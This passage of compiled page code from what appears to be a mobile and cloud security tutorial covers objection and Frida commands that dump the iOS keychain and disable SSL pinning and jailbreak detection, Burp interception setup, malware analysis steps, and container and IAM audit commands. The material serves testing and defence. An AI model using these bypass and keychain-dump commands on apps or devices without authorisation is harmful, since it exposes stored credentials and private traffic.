        children: "# Prerequisites: jailbroken iOS device or iOS runtime environment\n# Install objection\npip3 install objection\n\n# Basic IPA analysis\nobjection explore --startup-command \"env\" --gadget com.example.app\n\n# Command sequence within objection:\nios nsuserdefaults get\nios keychain dump\nios cookies get\nios info plist\n\n# Check for insecure data storage\nios nsuserdefaults get\n# Look for: plaintext passwords, tokens\n\n# Check for SSL pinning\nios sslpinning disable  # Only for testing, not in production\n\n# Dump keychain\nios keychain dump --json keychain_dump.json\n\n# Check for jailbreak detection bypasses\nios jailbreak disable\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mobile-app-traffic-interception-with-burp-suite",
      children: "Mobile App Traffic Interception with Burp Suite"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step-by-Step Setup:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Burp Suite Configuration:"
          })
        }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
          children: (0,jsx_runtime.jsx)(_components.code, {
            className: "language-bash",
            children: "# Start Burp on 0.0.0.0:8080 (bind to all interfaces for mobile testing)\njava -jar burpsuite.jar\n# Proxy -> Options -> Bind to 0.0.0.0:8080\n"
          })
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Android Emulator Proxy Setup:"
          })
        }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
          children: (0,jsx_runtime.jsx)(_components.code, {
            className: "language-bash",
            children: "# Set proxy on emulator\nadb shell settings put global http_proxy 10.0.2.2:8080\n# (10.0.2.2 = host machine from Android emulator)\n\n# Install Burp CA certificate\nadb push burp-ca.der /sdcard/Download/\n# Settings -> Security -> Install from storage\n"
          })
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "iOS Simulator Proxy Setup:"
          })
        }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
          children: (0,jsx_runtime.jsx)(_components.code, {
            className: "language-bash",
            children: "# Set proxy on iOS simulator\nxcrun simctl spawn booted bash -c \"networksetup -setwebproxy Wi-Fi 10.0.2.2 8080\"\n\n# Install Burp CA certificate\n# Open Safari -> http://burpsuite -> download cacert.der\n# Settings -> General -> Profile -> Install\n"
          })
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "Traffic Analysis:"
          })
        }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
          children: (0,jsx_runtime.jsx)(_components.code, {
            className: "language-bash",
            children: "# In Burp Suite -> HTTP history:\n# Look for:\n# - Unencrypted HTTP traffic\n# - API keys in query parameters\n# - PII in request/response bodies\n# - Missing security headers\n# - Insecure data transmission\n"
          })
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection — Certificate Pinning Bypass:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Android - Frida SSL pinning bypass\nfrida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause\n\n# iOS - Frida SSL pinning bypass\nfrida -U -f com.example.app -l ios-ssl-bypass.js --no-pause\n\n# objection SSL pinning disable\nobjection -g com.example.app explore\nios sslpinning disable\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mobile-device-management-mdm--byod",
      children: "Mobile Device Management (MDM) & BYOD"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mdm-architecture",
      children: "MDM Architecture"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A company-issued car. The company decides what maintenance is done, where it can be parked, and what routes are allowed. The employee drives it for work but can also use it for limited personal trips."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MDM Capabilities:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Capability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Implementation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Device enrollment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provision devices to management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apple DEP, Android Enterprise, Windows Autopilot"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Policy enforcement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enforce encryption, password policy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Configuration profiles (iOS), Device Policy (Android)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Remote wipe"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Erase device data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Factory reset via MDM push"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "App management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Install/remove enterprise apps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Managed Google Play, Apple VPP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance check"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Verify device security posture"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Check jailbreak, encryption, OS version"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Location tracking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find lost devices"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Managed via policy - privacy concerns"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MDM Enrollment Flow (iOS):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "1. Device powered on -> Setup Assistant starts\n2. Device contacts Apple DEP server\n3. DEP server identifies device (serial number in MDM)\n4. Device redirected to MDM server URL\n5. MDM pushes configuration profile to device\n6. Profile installs: restrictions, certificates, WiFi\n7. MDM confirms enrollment -> supervised mode\n8. MDM pushes apps from Apple VPP\n9. Compliance policies enforced\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "byod-bring-your-own-device",
      children: "BYOD (Bring Your Own Device)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " An employee bringing their personal car to deliver company packages. The company installs a GPS tracker (MDM agent) but only activates it during work hours. The rest of the time, the car is private."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "BYOD Security Models:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Model"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Privacy Impact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Corporate Data Protection"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Device-level MDM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full device management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (company can wipe entire device)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Work Profile (Android)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Separate managed profile"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (company can only wipe work profile)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "User Enrollment (iOS)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Managed Apple ID + separate volume"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (managed volume only)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MAM-only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manage apps, not device"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very high (no device access)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VDI/Container"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Virtual desktop for work"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very high (no local data)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very high"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Android Work Profile Setup:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Enterprise Mobility Management policies\n# Create work profile - separates personal and work apps\nadb shell am start -a android.action.DPM_CMD -e command create_work_profile\n\n# Scope: Work profile data is encrypted separately\n# Company can wipe work profile without touching personal data\n# Work apps are managed by MDM; personal apps remain private\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "iOS User Enrollment:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# iOS User Enrollment (iOS 13+)\n# Uses Managed Apple ID\n# Creates separate APFS volume for work data\n# Company can:\n#   - Wipe managed volume (personal data unaffected)\n#   - Install/manage work apps\n#   - Enforce passcode policy\n# Company CANNOT:\n#   - Access personal apps/data\n#   - Read iMessage, personal mail\n#   - View device location (supervised only)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ad-table--byod-models",
      children: "A&D Table — BYOD Models"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Model"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "User Privacy"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Corporate Security"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Complexity"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MDM (Corporate-owned)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Android Work Profile"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS User Enrollment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MAM-only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VDI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mobile-malware-analysis",
      children: "Mobile Malware Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "types-of-mobile-malware",
      children: "Types of Mobile Malware"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Distribution"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Spyware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Steals data, tracks location"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pegasus, FlexiSPY"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Side-loaded, enterprise abuse"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encrypts files, demands payment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android/Filecoder"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Third-party app stores"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Banking trojan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Steals banking credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EventBot, Anubis, TeaBot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing links"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Adware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Displays aggressive ads"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HiddenAds, MobiDash"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Google Play (camouflaged)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cryptominer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mines cryptocurrency"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android/Coinminer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Repackaged apps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Trojan dropper"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Downloads additional payload"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Agent Smith"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Repackaged legitimate apps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RAT (Remote Access)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full device control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android/SpyNote"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMS phishing"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mobile-malware-analysis-methodology",
      children: "Mobile Malware Analysis Methodology"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 1: Static Analysis"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Extract APK\nunzip -q suspicious.apk -d apk_extracted/\nls apk_extracted/  # classes.dex, AndroidManifest.xml, resources.arsc, lib/\n\n# Decompile to Java\njadx -d decompiled/ suspicious.apk\n\n# Check manifest for suspicious permissions\naapt dump permissions suspicious.apk\n# Dangerous combinations:\n# - RECEIVE_SMS + INTERNET + READ_CONTACTS\n# - CAMERA + RECORD_AUDIO + SYSTEM_ALERT_WINDOW\n# - BIND_ACCESSIBILITY_SERVICE + READ_LOGS\n\n# Check for known malware signatures\nunzip -l suspicious.apk | grep -i malware\n# Look for: packed code, obfuscated class names (a.a.a), strange entry points\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 2: Dynamic Analysis"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Run in isolated environment (Android emulator)\nemulator -avd analysis_device -no-window -no-audio\n\n# Install and execute\nadb install suspicious.apk\n\n# Monitor network traffic\nadb shell tcpdump -i any -w traffic.pcap\n\n# Monitor process creation\nadb shell while true; do ps | grep suspicious; sleep 1; done\n\n# Monitor file system changes\nadb shell inotifywait -m -r /data/data/com.suspicious.app/\n\n# Check for privilege escalation attempts\nadb shell dmesg | grep -E \"root|su|exploit|segfault\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 3: Network Analysis"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Analyze captured traffic\ntcpdump -r traffic.pcap -X\n\n# Look for:\n# - C2 server communication\n# - Data exfiltration (base64-encoded data transmissions)\n# - Encryption key exchange\n# - Command-and-control heartbeat patterns\n\n# Decrypt HTTPS traffic (Burp Suite)\n# (Requires CA certificate installation on emulator)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "repackaging-detection",
      children: "Repackaging Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Compare original vs repackaged APK\n# Step 1: Get original app signature\njarsigner -verify -verbose -certs original.apk\n\n# Step 2: Get repackaged app signature\njarsigner -verify -verbose -certs suspicious_copy.apk\n\n# Step 3: Compare signatures\n# If different -> repackaged app (fake version with malware)\n\n# Check for code injection\n# Look for unusual strings in decompiled code\ngrep -r \"http://|https://|\\.onion|\\.bit|C2|shell|exec|Runtime\" decompiled/\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "in-app-purchase--billing-fraud",
      children: "In-App Purchase / Billing Fraud"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Fraud Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detection"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Receipt spoofing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fake purchase receipts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Server-side receipt validation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Frida bypass"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime manipulation of purchase flow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integrity checks, anti-hooking"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "APK repackaging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modified app bypassing payment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "App signing verification"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Emulator fraud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fake transactions from emulators"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Device fingerprint, SafetyNet"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Chargeback fraud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disputed legitimate purchases"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Purchase pattern analysis"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Server-Side Receipt Validation (iOS):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "import requests\n\ndef validate_app_store_receipt(receipt_data, production=True):\n    \"\"\"\n    Validate iOS in-app purchase receipt on the server side.\n    DO NOT trust client-side receipt validation alone.\n    \"\"\"\n    if production:\n        url = \"https://buy.itunes.apple.com/verifyReceipt\"\n    else:\n        url = \"https://sandbox.itunes.apple.com/verifyReceipt\"\n\n    response = requests.post(url, json={\n        \"receipt-data\": receipt_data,\n        \"password\": \"YOUR_SHARED_SECRET\",\n        \"exclude-old-transactions\": True\n    })\n\n    result = response.json()\n    if result['status'] != 0:\n        return False\n\n    # Verify product ID and quantity\n    for receipt in result['receipt']['in_app']:\n        if receipt['product_id'] != 'com.example.product.subscription':\n            return False\n\n    # Verify transaction is not reused\n    if is_transaction_already_used(receipt['transaction_id']):\n        return False  # Replay attack\n\n    return True\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Receipt Validation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Client-side only:"
        }), " O(1) — trivially bypassed by Frida/objection"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Server-side validation:"
        }), " O(1) — one HTTP call, secure"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Transaction dedup:"
        }), " O(1) — lookup in database (indexed by transaction_id)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "practical-examples--full-command-reference",
      children: "Practical Examples — Full Command Reference"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cloud-iam-policy-analysis",
      children: "Cloud IAM Policy Analysis"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# AWS IAM Access Analyzer - find over-permissive access\naws accessanalyzer list-findings --analyzer-arn arn:aws:access-analyzer:us-east-1:ACCOUNT:analyzer/my-analyzer\n\n# AWS IAM simulate principal policy\naws iam simulate-principal-policy \\\n  --policy-source-arn arn:aws:iam::ACCOUNT:role/developer \\\n  --action-names \"s3:PutObject\" \"ec2:RunInstances\" \"iam:CreatePolicyVersion\"\n\n# Check for unused IAM roles (30+ days)\naws iam list-roles --query 'Roles[?CreateDate<=`2023-01-01`].[RoleName,CreateDate]'\n\n# S3 bucket policy analysis\naws s3api get-bucket-policy-status --bucket my-bucket\n# {\"PolicyStatus\":{\"IsPublic\":false}}\n\naws s3api get-bucket-acl --bucket my-bucket\naws s3api get-bucket-policy --bucket my-bucket\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "docker-security-audit",
      children: "Docker Security Audit"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Full docker-bench-security scan\ndocker run --pid=host --net=host --cap-add=audit_control \\\n  -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \\\n  -v /etc:/etc:ro docker/docker-bench-security\n\n# Check running containers\ndocker ps --quiet | xargs docker inspect --format '{{.Name}} {{.HostConfig.Privileged}}'\n\n# Check container capabilities\ndocker run --rm alpine capsh --print\n\n# Scan all local images\ndocker images --quiet | xargs -L1 trivy image\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "kubernetes-security-commands",
      children: "Kubernetes Security Commands"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Run kube-bench CIS benchmark\nkubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml\nkubectl logs job/kube-bench\n\n# Apply Pod Security Standards\nkubectl label --overwrite ns production pod-security.kubernetes.io/enforce=restricted\n\n# Create RBAC role and binding\nkubectl create role pod-reader --verb=get,list,watch --resource=pods\nkubectl create rolebinding pod-reader-binding --role=pod-reader --serviceaccount=default:my-sa\n\n# Apply network policy\nkubectl apply -f network-policy.yaml\n\n# Check admission controller status\nkubectl get validatingwebhookconfigurations\n\n# Verify secrets encryption\nkubectl get apiserver -o yaml | grep encryption\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "trivy-container-scanning",
      children: "Trivy Container Scanning"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Scan a single image\ntrivy image nginx:1.21.6\n\n# Scan with extensive output\ntrivy image --severity CRITICAL,HIGH --format sarif -o nginx-scan.sarif nginx:1.21.6\n\n# Scan a Kubernetes cluster\ntrivy k8s cluster --severity CRITICAL,HIGH\n\n# Scan a local directory (rootfs)\ntrivy filesystem --severity HIGH /var/lib/docker\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "falco-runtime-detection",
      children: "Falco Runtime Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
